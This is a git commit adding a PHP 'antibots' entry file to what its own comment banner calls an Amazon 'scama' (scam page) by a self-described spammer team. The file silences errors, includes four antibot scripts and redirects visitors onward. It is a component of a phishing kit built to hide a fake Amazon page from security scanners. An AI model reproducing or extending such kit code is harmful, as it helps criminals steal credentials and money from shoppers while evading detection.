0b109a288ac2935cf3b061ce948dc59836ea0633
yahyalamghari2020 <70844229+yahyalamghari2020@users.noreply.github.com>
2020-09-06 12:29:41 +0100

    Add files via upload

---
+++ test/antibots/index.php
@@ -0,0 +1,25 @@
+<?php
+session_start();
+error_reporting(0);
+/*   
+       #===========================================#
+       #   scama: Amazon Crew                      #
+       #   Team : Dreamhackers                     #
+       #   mode : in Moroccan spamer               #
+       #   creat : dexter & Patrick & Yassin       #
+       #   web : www.facebook.com/dreamdeface.org  #     
+       #===========================================#
+
+   Please Don't Talk About Me When I'm Gone Alfred Publishing 
+   Please don't forget to click save 
+							                         
+*/
+
+include "./antibots1.php";
+include "./antibots2.php";
+include "./antibots3.php";
+include "./antibots4.php";
+
+header("LOCATION: ../../index.php");
+
+?>
